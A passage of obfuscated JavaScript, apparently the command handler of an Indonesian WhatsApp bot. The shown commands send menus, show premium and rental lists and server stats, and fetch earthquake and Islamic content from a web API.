            _0x1c7aed(_0x5804c8(0x795), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x1e644e = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x3132da = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x564825 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x564825
                },
                'gifPlayback': !![],
                'caption': _0x3fad7f(_0x96c6c4, _0x2eeea8, _0x32b235, _0x3132da, _0x1e644e, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x763):
        case _0x5804c8(0x66d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#ephotomenu', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x5668dc = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x269a4a = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x41366e = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x41366e
                },
                'gifPlayback': !![],
                'caption': _0x19e764(_0x96c6c4, _0x2eeea8, _0x32b235, _0x269a4a, _0x5668dc, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xba0): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#logomenu', _0x1b1e88['sender'], _cmd);
            let _0x2c72cd = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x14213f = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x3bea42 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x3bea42
                },
                'gifPlayback': !![],
                'caption': _0x3163df(_0x96c6c4, _0x2eeea8, _0x32b235, _0x14213f, _0x2c72cd, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + ' Selamat ' + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571['audio_di_bagian_menu']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xc3d):
        case 'aturan':
        case 'aturanbot': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            var _0x1c926e = _0x5804c8(0x688);
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x1c926e,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x358b6e,
                        'body': '',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x2d1):
        case _0x5804c8(0x6ce):
        case _0x5804c8(0x336): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x88a), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x5d15d5 = '_*' + _0x358b6e + _0x5804c8(0x679) + _0x614da8[_0x5804c8(0x610)][_0x5804c8(0x35b)] + _0x5804c8(0x4d0) + _0x1117db[_0x5804c8(0x4bd)]('@')[0x0] + '\x0a*• Owner :* ' + _0x3b7c58 + 'owner\x0a*• Total Pengguna :* ' + pendaftar[_0x5804c8(0x977)] + _0x5804c8(0x8de) + _0x3b7c58 + '\x0a';
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5d15d5,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x358b6e,
                        'body': '',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x3ce):
        case _0x5804c8(0x1c9):
            _0x1c7aed(_0x5804c8(0x9bc), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x2c1510 = _0x5804c8(0x919) + _0x932571[_0x5804c8(0xcc8)] + _0x5804c8(0x772) + _0x932571[_0x5804c8(0x524)] + _0x5804c8(0x7c0);
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x414)]),
                'caption': _0x2c1510
            }, {
                'quoted': _0x51e31f
            });
            break;
        case _0x5804c8(0x134):
        case _0x5804c8(0x9da):
            var _0x1ea1ac = _0x5804c8(0x6a3);
            await _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'image': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x414)]),
                'caption': _0x1ea1ac
            }, {
                'quoted': _0x51e31f
            });
            break;
        case _0x5804c8(0xc9f):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0xb6b), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0xba1175 = await _0x3bdfda(_0x1b1e88[_0x5804c8(0xd13)], _cmdUser);
            _cmdUser[_0xba1175]['db'][_0x5804c8(0x743)]((_0x579a69, _0x48f128) => _0x579a69[_0x5804c8(0xaac)] < _0x48f128[_0x5804c8(0xaac)] ? 0x1 : -0x1), _cmd[_0x5804c8(0x743)]((_0x3475fb, _0x5b1a2d) => _0x3475fb['count'] < _0x5b1a2d[_0x5804c8(0xaac)] ? 0x1 : -0x1);
            var _0xba1175 = await _0x3bdfda(_0x1b1e88['sender'], _cmdUser),
                _0x27fa22 = _cmd[_0x5804c8(0x977)];
            if (_0x27fa22 > 0xa) _0x27fa22 = 0xa;
            var _0x4a8e4e = _cmdUser[_0xba1175]['db'][_0x5804c8(0x977)];
            if (_0x4a8e4e > 0x5) _0x4a8e4e = 0x5;
            var _0x7fe69b = 0x0;
            for (let _0x75f840 of _cmdUser[_0xba1175]['db']) {
                _0x7fe69b = _0x7fe69b + _0x75f840[_0x5804c8(0xaac)];
            }
            var _0x523589 = 0x0;
            for (let _0x23a099 of _cmd) {
                _0x523589 = _0x523589 + _0x23a099[_0x5804c8(0xaac)];
            }
            var _0x39c4be = _0x5804c8(0x4c0) + _0x523589 + _0x5804c8(0x2b3) + _0x7fe69b + '\x0a\x0a';
            _0x39c4be += _0x5804c8(0x31a);
            for (let _0x5f0f31 = 0x0; _0x5f0f31 < _0x27fa22; _0x5f0f31++) {
                _0x39c4be += '• ' + _cmd[_0x5f0f31][_0x5804c8(0x452)] + _0x5804c8(0x5f7) + _cmd[_0x5f0f31][_0x5804c8(0xaac)] + '\x0a';
            }
            _0x39c4be += _0x5804c8(0x9cf);
            for (let _0x961c86 = 0x0; _0x961c86 < _0x4a8e4e; _0x961c86++) {
                _0x39c4be += '• ' + _cmdUser[_0xba1175]['db'][_0x961c86][_0x5804c8(0x452)] + _0x5804c8(0x5f7) + _cmdUser[_0xba1175]['db'][_0x961c86][_0x5804c8(0xaac)] + '\x0a';
            }
            _0x358f3b(_0x39c4be);
            break;
        case _0x5804c8(0x9cc):
        case _0x5804c8(0xd97): {
            await _0x614da8[_0x5804c8(0xcb0)](_0x1b1e88[_0x5804c8(0x60f)], _0x374470[_0x5804c8(0x686)](_0x37a81a => _0x37a81a[_0x5804c8(0x4bd)]('@')[0x0]), _0x1b1e88), await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571['audio_di_bagian_owner']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x5d9): {
            if (!_0x7b6ab6) return _0x358f3b('Lu Siapa Gw Ga Kenal Gausah Gatel Lopyu\" Segala Anj');
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x5804c8(0xcae)),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x8f1):
        case 'drive':
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            var _0x224769 = await nou[_0x5804c8(0x93b)][_0x5804c8(0x6ce)]();
            _0x1c7aed(_0x5804c8(0xb78), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b(_0x5804c8(0x1ce) + _0x224769[_0x5804c8(0x886)] + _0x5804c8(0x494) + _0x224769['usedGb'] + ' GB (' + _0x224769[_0x5804c8(0x3c2)] + _0x5804c8(0xc25) + _0x224769['freeGb'] + _0x5804c8(0x31d) + _0x224769[_0x5804c8(0x9ce)] + '%)');
            break;
        case _0x5804c8(0xc6e):
        case _0x5804c8(0x448):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x1c7aed(_0x5804c8(0xa08), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var {
                download: _0xe55fb7, upload: _0xa54fd1
            } = await checkBandwidth();
            _0x358f3b('*Bandwidth Server*\x0a\x0a*>* Upload : ' + _0xa54fd1 + _0x5804c8(0x4bb) + _0xe55fb7);
            break;
        case _0x5804c8(0x903):
        case _0x5804c8(0x62b):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x75f0ff) return _0x358f3b(_0x5804c8(0xacd) + _0x3b7c58 + _0x5804c8(0x964));
            _0x1c7aed(_0x5804c8(0xae2), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            if (_0x7b6ab6) return _0x358f3b(_0x5804c8(0x387));
            if (_prem['getPremiumExpired'](_0x1b1e88[_0x5804c8(0xd13)], premium) == 'PERMANENT') return _0x358f3b(_0x5804c8(0xd8c));
            let _0x59637f = ms(_prem['getPremiumExpired'](_0x1b1e88[_0x5804c8(0xd13)], premium) - Date[_0x5804c8(0x7e5)]()),
                _0x435ea6 = '*Expire :* ' + _0x59637f[_0x5804c8(0x62f)] + _0x5804c8(0xa55) + _0x59637f[_0x5804c8(0x283)] + _0x5804c8(0x458) + _0x59637f[_0x5804c8(0xb15)] + ' minute(s)';
            _0x358f3b(_0x435ea6);
            break;
        case _0x5804c8(0x81d):
        case 'listprem':
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x521), _0x1b1e88['sender'], _cmd);
            let _0x581f3b = _0x5804c8(0x731) + premium[_0x5804c8(0x977)] + '\x0a\x0a',
                _0x527071 = [];
            for (let _0xb4a815 of premium) {
                _0x527071[_0x5804c8(0x453)](_0xb4a815['id']), _0x581f3b += _0x5804c8(0x2ea) + _0xb4a815['id'][_0x5804c8(0x4bd)]('@')[0x0] + '\x0a';
                if (_0xb4a815['expired'] === _0x5804c8(0xd8c)) {
                    let _0xba8237 = _0x5804c8(0xd8c);
                    _0x581f3b += _0x5804c8(0xa58);
                } else {
                    let _0x371137 = ms(_0xb4a815[_0x5804c8(0xc1f)] - Date['now']());
                    _0x581f3b += _0x5804c8(0x2fe) + _0x371137[_0x5804c8(0x62f)] + _0x5804c8(0xa55) + _0x371137[_0x5804c8(0x283)] + _0x5804c8(0x458) + _0x371137[_0x5804c8(0xb15)] + _0x5804c8(0x6fd) + _0x371137['seconds'] + ' second(s)\x0a\x0a';
                }
            }
            _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x581f3b, _0x1b1e88);
            break;
        case _0x5804c8(0x1f9):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            let _0x2e3da = _0x5804c8(0x7a7) + sewa['length'] + '\x0a\x0a',
                _0xf73bcc = [];
            for (let _0x3d3b30 of sewa) {
                _0x1c7aed(_0x5804c8(0x985), _0x1b1e88['sender'], _cmd), _0x2e3da += _0x5804c8(0xcce) + await _0x1cbd73(_0x3d3b30['id']) + _0x5804c8(0x302) + _0x3d3b30['id'] + '\x0a';
                if (_0x3d3b30['expired'] === 'PERMANENT') {
                    let _0x230756 = 'PERMANENT';
                    _0x2e3da += _0x5804c8(0xa58);
                } else {
                    let _0x3c95f2 = ms(_0x3d3b30[_0x5804c8(0xc1f)] - Date[_0x5804c8(0x7e5)]());
                    _0x2e3da += '*Expire :* ' + _0x3c95f2[_0x5804c8(0x62f)] + _0x5804c8(0xa55) + _0x3c95f2[_0x5804c8(0x283)] + ' hour(s) ' + _0x3c95f2[_0x5804c8(0xb15)] + _0x5804c8(0x6fd) + _0x3c95f2['seconds'] + _0x5804c8(0xb8b);
                }
            }
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x2e3da
            }, {
                'quoted': _0x1b1e88
            });
            break;
        case 'speed':
        case _0x5804c8(0x639): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            const _0x394ad5 = process['memoryUsage']();
            let _0x5974d0 = speed(),
                _0x3a9c57 = speed() - _0x5974d0,
                _0x3108e8 = performance[_0x5804c8(0x7e5)](),
                _0x5d31fd = performance['now'](),
                _0x5d97cb = (_0x5804c8(0x3ee) + _0x3a9c57[_0x5804c8(0xac7)](0x4) + _0x5804c8(0x35d) + formatp(os[_0x5804c8(0x16e)]() - os[_0x5804c8(0x505)]()) + _0x5804c8(0xc99) + formatp(os[_0x5804c8(0x16e)]()) + _0x5804c8(0x54b) + Object[_0x5804c8(0xafa)](_0x394ad5)[_0x5804c8(0x686)]((_0x36c681, _0x4d6150, _0x423cf4) => _0x36c681[_0x5804c8(0x2b9)](Math[_0x5804c8(0x7f6)](..._0x423cf4[_0x5804c8(0x686)](_0x513f8e => _0x513f8e[_0x5804c8(0x977)])), ' ') + ': ' + formatp(_0x394ad5[_0x36c681]))[_0x5804c8(0xc6c)]('\x0a') + '\x0a')['trim']();
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5d97cb,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x358b6e,
                        'body': '',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0xc06): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            let _0x555e2c = await fetchJson(_0x5804c8(0x7ba) + _0x932571[_0x5804c8(0xa28)]);
            const _0x246eb1 = _0x555e2c[_0x5804c8(0x6b2)][_0x5804c8(0x34a)],
                _0x3f6446 = _0x555e2c['result'][_0x5804c8(0xbbb)],
                _0x340b6b = _0x555e2c[_0x5804c8(0x6b2)][_0x5804c8(0x687)],
                _0x185c08 = _0x555e2c['result']['coordinates'],
                _0x57df21 = _0x555e2c['result'][_0x5804c8(0x712)],
                _0x22c0db = _0x555e2c[_0x5804c8(0x6b2)]['bujur'],
                _0xfe666a = _0x555e2c[_0x5804c8(0x6b2)][_0x5804c8(0x829)],
                _0x15a1ad = _0x555e2c['result'][_0x5804c8(0x608)],
                _0x5cea91 = _0x555e2c[_0x5804c8(0x6b2)][_0x5804c8(0xb09)],
                _0x5701b8 = _0x555e2c['result'][_0x5804c8(0xd79)],
                _0x1f11fb = _0x555e2c[_0x5804c8(0x6b2)][_0x5804c8(0x901)];
            var _0x5d15d5 = _0x5804c8(0x334) + _0x246eb1 + _0x5804c8(0x649) + _0x3f6446 + _0x5804c8(0x602) + _0x340b6b + _0x5804c8(0x63c) + _0x185c08 + _0x5804c8(0xd6f) + _0x57df21 + '\x0a*• Bujur :* ' + _0x22c0db + _0x5804c8(0x9fa) + _0xfe666a + '\x0a*• Kedalaman :* ' + _0x15a1ad + _0x5804c8(0x60d) + _0x5cea91 + _0x5804c8(0xad3) + _0x5701b8 + '\x0a*• Dirasakan :* ' + _0x1f11fb + '\x0a';
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x555e2c['result'][_0x5804c8(0x481)]
                },
                'caption': _0x5d15d5
            }, {
                'quoted': _0x51e31f
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xc15): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x3ac) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xcfe));
            try {
                let _0x281ea9 = await fetchJson('https://api.zeeoneofc.my.id/api/islam/kisahnabi?nabi=' + _0x1b04cf + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
                const _0x4d403b = _0x281ea9[_0x5804c8(0x6b2)][_0x5804c8(0x35b)],
                    _0x3b6890 = _0x281ea9[_0x5804c8(0x6b2)][_0x5804c8(0xa57)],
                    _0x569687 = _0x281ea9[_0x5804c8(0x6b2)]['death_age'],
                    _0x4e3cdd = _0x281ea9[_0x5804c8(0x6b2)][_0x5804c8(0xd09)],
                    _0x1ad7e3 = _0x281ea9[_0x5804c8(0x6b2)][_0x5804c8(0x13d)];
                var _0x2ee14c = _0x5804c8(0x77c) + _0x4d403b + _0x5804c8(0x44c) + _0x3b6890 + _0x5804c8(0x268) + _0x569687 + _0x5804c8(0x6e7) + _0x4e3cdd + '\x0a\x0aKisah Nabi *' + _0x4d403b + _0x5804c8(0xba3) + _0x1ad7e3;
                _0x358f3b(_0x2ee14c);
            } catch (_0x5648da) {
                _0x358f3b(_0x5804c8(0xc10));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x5d4): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            try {
                let _0x414b24 = await fetchJson(_0x5804c8(0x2e2) + _0x932571['BotKey']);
                const _0x2d4270 = _0x414b24[_0x5804c8(0x6b2)][_0x5804c8(0x97d)],
                    _0x2d2bfe = _0x414b24[_0x5804c8(0x6b2)][_0x5804c8(0x828)],
                    _0x276f4c = _0x414b24[_0x5804c8(0x6b2)]['arabic'],
                    _0x23091c = _0x414b24[_0x5804c8(0x6b2)][_0x5804c8(0xa5a)],
                    _0x152269 = _0x414b24[_0x5804c8(0x6b2)][_0x5804c8(0x638)];
                var _0x332efc = _0x5804c8(0x1cb) + _0x2d4270 + _0x5804c8(0x724) + _0x276f4c + _0x5804c8(0x6ee) + _0x2d2bfe + _0x5804c8(0x755) + _0x23091c + _0x5804c8(0x889) + _0x152269;
                _0x358f3b(_0x332efc);
            } catch (_0x10fec7) {
                _0x358f3b(_0x5804c8(0xd77));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x3c3):
        case _0x5804c8(0x220): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            try {
                let _0x45ec74 = await fetchJson(_0x5804c8(0xa60) + _0x932571[_0x5804c8(0xc67)]);
                const _0x384676 = _0x45ec74[_0x5804c8(0x6b2)];
                var _0x13e6fc = '_*List Surah*_\x0a\x0a' + _0x384676;
                _0x358f3b(_0x13e6fc);
            } catch (_0x273c58) {
                _0x358f3b('Maaf Terjadi Kesalahan');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x38c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            try {
                let _0x3c35c8 = await fetchJson(_0x5804c8(0xc78) + _0x932571['BotKey']);
                const _0x4fd077 = _0x3c35c8['result'][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x428)][_0x5804c8(0xae9)],
                    _0x65cefc = _0x3c35c8['result'][_0x5804c8(0xc53)]['nameOfSurah']['long'],
                    _0x120a9f = _0x3c35c8[_0x5804c8(0x6b2)]['resources'][_0x5804c8(0x271)]['transliteration']['id'],
                    _0x55dd22 = _0x3c35c8['result'][_0x5804c8(0xc53)][_0x5804c8(0x488)],
                    _0x3d0b47 = _0x3c35c8[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x835)]['juz'],
                    _0x7b330e = _0x3c35c8[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0x6f6)],
                    _0x56ca8e = _0x3c35c8[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0x658)],
                    _0x2ced88 = _0x3c35c8[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x73c)][_0x5804c8(0xc41)],
                    _0x4e7da5 = _0x3c35c8[_0x5804c8(0x6b2)]['resources'][_0x5804c8(0xa14)]['text'][_0x5804c8(0xc29)]['en'],
                    _0x293739 = _0x3c35c8['result'][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x43b)]['id'],
                    _0x49393c = _0x3c35c8[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x43b)]['en'],
                    _0x288ccf = _0x3c35c8[_0x5804c8(0x6b2)][_0x5804c8(0xc53)]['ayah'][_0x5804c8(0x360)]['id']['long'];
                var _0x23b3ff = _0x5804c8(0x99b) + _0x65cefc + _0x5804c8(0x6ee) + _0x120a9f + _0x5804c8(0xb37) + _0x55dd22 + _0x5804c8(0xa1f) + _0x3d0b47 + _0x5804c8(0xa71) + _0x7b330e + '\x0aAyat Ke : ' + _0x56ca8e + _0x5804c8(0xb90) + _0x2ced88 + _0x5804c8(0x94c) + _0x4e7da5 + _0x5804c8(0xa46) + _0x293739 + _0x5804c8(0x26d) + _0x49393c + '\x0a\x0aTafsir Surah : ' + _0x288ccf;
                await _0x358f3b(_0x23b3ff), await _0x358f3b(_0x5804c8(0xca9)), await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'audio': {
                        'url': _0x4fd077
                    },
                    'mimetype': 'audio/mpeg'
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x472ce1) {
                _0x358f3b('Maaf Terjadi Kesalahan');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xc89): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6c1) + (_0x3b7c58 + _0x453fc1) + ' 1');
            try {
                let _0x353c7e = await fetchJson('https://api.zeeoneofc.my.id/api/islam/randomquran2?juz=' + _0x1b04cf + '&apikey=' + _0x932571[_0x5804c8(0xc67)]);
                const _0x292e8a = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x428)]['primary'],
                    _0x2ecc8b = _0x353c7e[_0x5804c8(0x6b2)]['resources'][_0x5804c8(0x271)][_0x5804c8(0x173)],
                    _0xc4c6dc = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0x271)][_0x5804c8(0xc29)]['id'],
                    _0x1c6e07 = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0x488)],
                    _0x1661aa = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)]['ayah'][_0x5804c8(0x835)][_0x5804c8(0x399)],
                    _0xb31b5e = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0x6f6)],
                    _0x16f6c1 = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0x658)],
                    _0x5448e6 = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0xa14)]['text'][_0x5804c8(0xc41)],
                    _0x135aa4 = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)]['ayah'][_0x5804c8(0x73c)][_0x5804c8(0xc29)]['en'],
                    _0x288178 = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)][_0x5804c8(0xa14)][_0x5804c8(0x43b)]['id'],
                    _0x42a882 = _0x353c7e[_0x5804c8(0x6b2)][_0x5804c8(0xc53)]['ayah'][_0x5804c8(0x43b)]['en'],
                    _0x1dd4e8 = _0x353c7e['result']['resources'][_0x5804c8(0xa14)][_0x5804c8(0x360)]['id'][_0x5804c8(0x173)];
                var _0x23b3ff = _0x5804c8(0x99b) + _0x2ecc8b + '\x0aTeks Latin : ' + _0xc4c6dc + _0x5804c8(0xb37) + _0x1c6e07 + '\x0aJuz : ' + _0x1661aa + '\x0aTotal Ayat : ' + _0xb31b5e + '\x0aAyat Ke : ' + _0x16f6c1 + _0x5804c8(0xb90) + _0x5448e6 + _0x5804c8(0x94c) + _0x135aa4 + '\x0a\x0aArti Dalam Bahasa Indonesia : ' + _0x288178 + _0x5804c8(0x26d) + _0x42a882 + _0x5804c8(0xc52) + _0x1dd4e8;
                await _0x358f3b(_0x23b3ff), await _0x358f3b('Tunggu Sebentar Audio Sedang Dikirim'), await _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                    'audio': {
                        'url': _0x292e8a
                    },
                    'mimetype': _0x5804c8(0x8d4)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x183b46) {
                _0x358f3b('Maaf Terjadi Kesalahan');
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case 'quranaudio':
        case _0x5804c8(0x298): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
